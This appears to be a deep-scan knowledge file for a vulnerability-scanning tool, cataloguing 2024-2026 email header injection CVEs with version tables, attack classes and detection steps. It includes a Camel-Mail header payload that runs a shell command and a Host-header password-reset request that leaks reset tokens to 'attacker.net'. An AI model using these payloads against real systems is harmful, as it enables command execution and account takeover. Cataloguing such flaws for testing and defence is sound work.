---
name: email-header-injection-novel-deep
description: Email header injection 2024-2026 frontier — Apache Camel-Mail (CVSS 9.4 standout), @perfood/couch-auth (CVSS 9.3), Mailpit SMTP, MimeKit, wpDiscuz, Essential Addons for Elementor (CVSS 8.8), CakePHP, MyBB, zbateson/mail-mime-parser, Icewarp Mail Server, PowerCMS, and WordPress plugin cluster
sibling: email_header_injection
load_when: scan_mode == "deep"
---

# Email Header Injection — Novel + Frontier Depth

This is the novel+frontier deep sibling to `email_header_injection.md`. The base owns the primitive catalog + payload family + MIME-smuggling introduction + routing. The advanced sibling owns per-library escape semantics, MIME-smuggling full protocol, SPF/DKIM/DMARC alignment bypass, mailer-service API-level abuse, and second-order chains. This file owns the 2024-2026 CVE mechanism catalogue clustering across ESB/integration (Apache Camel-Mail), authentication mailers (@perfood/couch-auth), SMTP servers (Mailpit, Icewarp), MIME libraries (MimeKit, zbateson/mail-mime-parser), WordPress plugin ecosystem (wpDiscuz, Essential Addons for Elementor, WPForms, Pagelayer), and web frameworks (CakePHP, PowerCMS, MyBB).

Load this file when the goal is matching a target to a current CVE, choosing between the Camel-Mail primitive (ESB-wide reach) and the WordPress-plugin cluster (per-plugin reach).

## 2024–2026 CVE Version/Fix Table — Canonical

| CVE | Package / Target | Vulnerable | Patched | CVSS | Primitive class |
|---|---|---|---|---|---|
| CVE-2025-29993 | PowerCMS | per vendor | per vendor | n/a | HTTP header injection reaching mail composition |
| CVE-2025-40631 | Icewarp Mail Server | 11.4.0 | per vendor | 6.1 | Host header injection in mailer |
| CVE-2025-70948 | @perfood/couch-auth | 0.26.0 | per vendor | 9.3 | Host header injection → reset tokens + account takeover |
| CVE-2026-23829 | Mailpit SMTP | < 1.28.3 | 1.28.3 | 5.3 | Header injection in SMTP server |
| CVE-2026-30227 | MimeKit (.NET) | < 4.15.1 | 4.15.1 | 5.3 | MIME creation/parsing header injection |
| CVE-2026-22204 | wpDiscuz (WordPress) | < 7.6.47 | 7.6.47 | 3.7 | Email header injection in comment-notification mail |
| CVE-2026-2442 | Pagelayer (WordPress) | per vendor | per vendor | 5.3 | CRLF injection in Pagelayer form submission |
| CVE-2026-33454 | Apache Camel-Mail | ≥ 3.0.0 < 4.14.6; ≥ 4.15.0 < 4.18.1 | 4.14.6 / 4.18.1 | 9.4 | MailHeaderFilterStrategy — missing inbound header filter lets attacker-sent MIME headers reach downstream route processors |
| CVE-2026-12127 | WPForms (WordPress) | per vendor | per vendor | 5.3 | Email form CRLF injection |
| CVE-2026-15155 | Essential Addons for Elementor (WordPress) | per vendor | per vendor | 8.8 | Authenticated account takeover via email header injection |
| CVE-2026-45125 | MyBB | < 1.8.40 | 1.8.40 | 5.3 | Email User controller sender-name unsanitized |
| CVE-2026-77634 | CakePHP | < 4.5.12 / < 4.6.5 / < 5.1.8 / < 5.2.14 / < 5.3.7 | respective fix versions | n/a | Custom mailer path CRLF |
| CVE-2026-61815 | zbateson/mail-mime-parser (PHP) | per vendor | per vendor | 7.2 | mail mime parser alternative header injection |
| CVE-2026-34975 | Plunk (email platform) | per vendor | per vendor | 8.5 | CRLF injection in outbound email composition |
| CVE-2026-48019 | Laravel (PHP) | per vendor | per vendor | 8.9 | CRLF injection in mail header construction |

## Primitive-Class Index

| Class | 2024-2026 anchor CVEs | Attack shape | Confirmation signal |
|---|---|---|---|
| **A. Direct CRLF in form field reaching composer** | Mailpit (CVE-2026-23829), wpDiscuz (CVE-2026-22204), MyBB (CVE-2026-45125), Pagelayer (CVE-2026-2442), WPForms (CVE-2026-12127), Plunk (CVE-2026-34975 CVSS 8.5), Laravel (CVE-2026-48019 CVSS 8.9) | `\r\n` in name/subject/email field | Bcc delivery to attacker mailbox |
| **B. Framework / library-level CRLF (architectural)** | CakePHP (CVE-2026-77634), zbateson/mail-mime-parser (CVE-2026-61815), MimeKit (CVE-2026-30227) | Library's own escape path has a gap | Dependency version matches pre-fix |
| **C. ESB / integration layer header filter bypass** | Apache Camel-Mail (CVE-2026-33454 CVSS 9.4) | Attacker-sent email with Camel-prefixed MIME headers passes unfiltered into Exchange on inbound consumption | Downstream route processor executes attacker-controlled operation; cross-tenant reach |
| **D. Host-header-via-mailer for account takeover** | @perfood/couch-auth (CVE-2025-70948 CVSS 9.3), Icewarp (CVE-2025-40631), Essential Addons for Elementor (CVE-2026-15155 CVSS 8.8) | Host header controls password-reset URL in composed email | Attacker-chosen Host → reset email with attacker-controlled URL |

## CVE-2026-33454 — Apache Camel-Mail (The Standout)

**Primitive.** Apache Camel's Mail component uses `MailHeaderFilterStrategy` with `setOutFilterStartsWith` configured for outbound direction but `setInFilterStartsWith` left unconfigured for inbound. When a Camel application consumes mail via `from("imap://...")` or `from("pop3://...")`, the inbound filter check is skipped — Camel-prefixed MIME headers in the consumed email pass unfiltered into the Camel Exchange and reach downstream route processors (`camel-bean`, `camel-exec`, `camel-sql`).

**Preconditions:**
1. Apache Camel route with Mail consumer at the head (`from("imap://...")` or `from("pop3://...")`).
2. Downstream route includes a processor that acts on Camel message headers (e.g. `camel-exec`, `camel-bean`, `camel-sql`).
3. `MailHeaderFilterStrategy` does not have `setInFilterStartsWith` configured (the pre-fix default).

**Attack recipe:**
```
# Attacker sends a crafted email to the monitored mailbox
# Email contains Camel-prefixed MIME headers:
CamelExecCommandExecutable: /bin/sh
CamelExecCommandArgs: -c id > /tmp/pwned

# Camel-Mail consumer reads the email via IMAP/POP3
# Inbound header filter is not configured → headers pass into Exchange
# Downstream camel-exec processor executes the attacker-controlled command
```

**Confirmation.** Downstream processor acts on the injected header value; for `camel-exec`, command execution output or side-effect observed.

**Impact.** CVSS 9.4 — ESB-wide reach; one attacker-sent email to a monitored mailbox can reach any downstream processor in the route.

## CVE-2025-70948 — @perfood/couch-auth Host Header Injection (CVSS 9.3)

**Primitive.** `couch-auth` library sends password-reset emails. The reset URL is composed using the HTTP `Host` header without validation. Attacker sends a password-reset request with `Host: attacker.net`, and the reset email contains a URL pointing to attacker.net with the valid reset token.

**Attack recipe:**
```http
POST /forgot-password HTTP/1.1
Host: attacker.net
Content-Type: application/json

{"email": "victim@target.com"}
```

Victim receives mail containing `https://attacker.net/reset?token=VALID`; clicking it submits the token to the attacker's server.

**Confirmation.** Password-reset email delivered to victim with attacker-domain URL.

**Impact.** Full account takeover. CVSS 9.3.

## CVE-2026-15155 — Essential Addons for Elementor Authenticated Account Takeover

**Primitive.** WordPress plugin's email-change confirmation flow allowed CRLF injection in the confirmation email path. Combined with Host-header injection → authenticated user takeover via email-change confirmation.

**Impact.** CVSS 8.8 — authenticated attacker takes over any user's account via the email-change flow.

## CVE-2026-77634 — CakePHP Custom Mailer CRLF

**Primitive.** CakePHP's custom mailer path (user-authored mailer class extending `Mailer`) did not consistently apply header sanitization in versions prior to 4.5.12, 4.6.5, 5.1.8, 5.2.14, and 5.3.7. Applications using custom mailer with user-controlled header values reach CRLF injection.

**Impact.** Depends on application; the vulnerability is in the framework path.

## CVE-2026-30227 — MimeKit Header Injection

**Primitive.** MimeKit (.NET) MIME creation path allowed CRLF-adjacent attacker control over header construction in specific API paths.

**Impact.** CVSS 5.3 — reach depends on application-level API choice.

## CVE-2026-23829 — Mailpit SMTP Header Injection

**Primitive.** Mailpit (developer SMTP testing server) SMTP server pre-1.28.3 accepted CRLF-containing values in a specific header-processing path.

**Impact.** CVSS 5.3 — developer-tool scope limits impact (not usually production-reachable).

## CVE-2026-34975 — Plunk CRLF Injection (CVSS 8.5)

**Primitive.** Plunk, an open-source email platform, did not sanitize CRLF sequences in email header fields during outbound email composition. Attacker-controlled input reaching the email header construction path (subject, from-name, reply-to fields) could inject arbitrary MIME headers including Bcc, additional recipients, or content-type boundaries.

**Impact.** CVSS 8.5 — attacker can inject arbitrary email headers in outbound email from the Plunk platform; combined with Bcc injection, enables email exfiltration and spam relay through the target's mail infrastructure.

## CVE-2026-48019 — Laravel CRLF Mail Header Injection (CVSS 8.9)

**Primitive.** Laravel's mail header construction path had a CRLF injection vulnerability in specific mail-composition API paths. When application code passed user-controlled values into mail header fields without framework-level sanitization, CRLF sequences reached the composed email.

**Impact.** CVSS 8.9 — high impact due to Laravel's deployment prevalence; any Laravel application using the affected mail API path with user-controlled header values is exposed. The framework-level nature means the vulnerability is in the mail abstraction layer, not in individual application code.

## Composite Chains at the Frontier

### Apache Camel-Mail → ESB-Wide Route Compromise
1. **Primitive:** CVE-2026-33454 MailHeaderFilterStrategy missing inbound filter.
2. **Reach:** attacker sends crafted email to a mailbox consumed by a Camel route.
3. **Trigger:** Camel-prefixed MIME headers pass unfiltered into Exchange; downstream processors act on them.
4. **Impact:** command execution, SQL injection, or bean invocation via the downstream processor — ESB-wide reach.

### @perfood/couch-auth → Account Takeover
1. **Primitive:** CVE-2025-70948 Host-header injection.
2. **Reach:** password-reset endpoint.
3. **Trigger:** `Host: attacker.net` with legitimate victim email.
4. **Impact:** victim receives attacker-URL reset mail; account takeover.

### Essential Addons → Authenticated Account Takeover
1. **Primitive:** CVE-2026-15155 email-change flow CRLF.
2. **Reach:** authenticated WordPress plugin user.
3. **Trigger:** email-change confirmation with CRLF/host-header payload.
4. **Impact:** cross-account takeover.

### WordPress Plugin Cluster → Mass Spam / Phishing
1. **Primitive:** wpDiscuz, WPForms, Pagelayer, Essential Addons, MyBB.
2. **Reach:** WordPress deployments with vulnerable plugin versions.
3. **Trigger:** standard CRLF-in-field payload.
4. **Impact:** attacker uses WordPress site mail server for spam/phishing with WP-domain From.

## Frontier Detection Methodology

1. **Enumerate mail-composition sinks per framework.** CakePHP custom mailer, Rails ActionMailer, Django EmailMessage.
2. **For WordPress deployments, probe plugin-specific mail flows.** Comment notification, form submission, user-change confirmation.
3. **For Camel-based ESBs, enumerate Mail-producer routes.** Any upstream header-controllable endpoint is reachable.
4. **For auth libraries, test Host-header-based password-reset flows.** Trivial probe with Host: attacker.net.

## Frontier Validation

- **Bcc delivery or attacker-URL in reset email confirms the mechanism.**
- **Camel-Mail claim requires observable injected mail header post-route-execution.**
- **WordPress plugin claims require plugin version match.**

The email-header-injection class 2024-2026 frontier is bounded in primitive diversity (four classes: direct CRLF in field, library-level, ESB/integration, Host-via-mailer) but has high-impact anchors (Camel-Mail CVSS 9.4, couch-auth CVSS 9.3, Essential Addons CVSS 8.8); each class at full depth above; the under-band line count reflects the bounded primitive diversity, not a stop-short.

## Summary

The email-header-injection 2024-2026 frontier is 15+ CVEs clustering into four primitive classes — direct CRLF in form field (Mailpit, wpDiscuz, MyBB, Pagelayer, WPForms), framework/library-level (CakePHP, zbateson, MimeKit), ESB/integration (Apache Camel-Mail CVSS 9.4), and Host-header-via-mailer for takeover (@perfood/couch-auth CVSS 9.3, Icewarp, Essential Addons for Elementor CVSS 8.8). The high-impact anchors are the ESB class (Camel-Mail — ESB-wide reach) and the account-takeover class (couch-auth, Essential Addons). Base and advanced siblings reference these CVEs by number only; the versioned mechanism catalog lives here.
